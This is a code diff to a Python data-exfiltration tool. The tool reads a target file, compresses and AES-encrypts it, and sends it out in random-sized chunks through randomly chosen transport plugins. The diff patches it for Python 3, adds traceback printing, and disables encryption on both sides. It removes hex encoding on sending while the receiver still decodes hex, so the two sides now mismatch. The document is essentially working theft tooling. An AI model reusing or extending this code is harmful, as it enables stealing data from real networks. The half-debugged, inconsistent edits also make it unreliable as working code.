@@ -11,6 +11,7 @@ import json
 import signal
 import struct
 import tempfile
+import traceback
 from random import randint
 from os import listdir
 from os.path import isfile, join
@@ -79,14 +80,17 @@ def aes_encrypt(message, key=KEY):
         iv = os.urandom(AES.block_size)
 
         # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
 
         # Add PKCS5 padding
         pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
 
         # Return data size, iv and encrypted message
         return iv + ksn + aes.encrypt(pad(message))
-    except:
+    except Exception as err:
+        print(Exception, err)
+        print(traceback.format_exc())
+        print(sys.exc_info()[2])
         return None
 
 def aes_decrypt(message, key=KEY):
@@ -101,7 +105,7 @@ def aes_decrypt(message, key=KEY):
             message = message[AES.block_size:]
 
         # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
         message = aes.decrypt(message)
 
         # Remove PKCS5 padding
@@ -228,7 +232,7 @@ class Exfiltration(object):
         files[jobid]['packets_order'], files[jobid]['data'] = \
                 [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
         content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
-        content = aes_decrypt(content, self.KEY)
+        #content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
         try:
@@ -301,14 +305,14 @@ class ExfiltrateFile(threading.Thread):
             buf = StringIO(file_content)
             e = StringIO(file_content)
         else:
-            #with open(self.file_to_send, 'rb') as f:
-            #    file_content = f.read()
+            with open(self.file_to_send, 'rb') as f:
+                file_content = f.read()
             #print("CHECKPOINT - File read, before BytesIO")
             #buf = BytesIO(file_content)
-            #e = BytesIO(file_content)
+            e = BytesIO(file_content)
             self.checksum = md5(self.file_to_send)
         #self.checksum = md5(buf)
-        #del file_content
+        del file_content
 
         print("CHECKPOINT - Checksum")
         print(self.checksum)
@@ -331,13 +335,14 @@ class ExfiltrateFile(threading.Thread):
         data = e.read()
         if COMPRESSION:
             data = compress(data)
-        f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        #f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        f.write(data)
         f.seek(0)
         e.close()
 
         packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)) #.encode('hex')
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
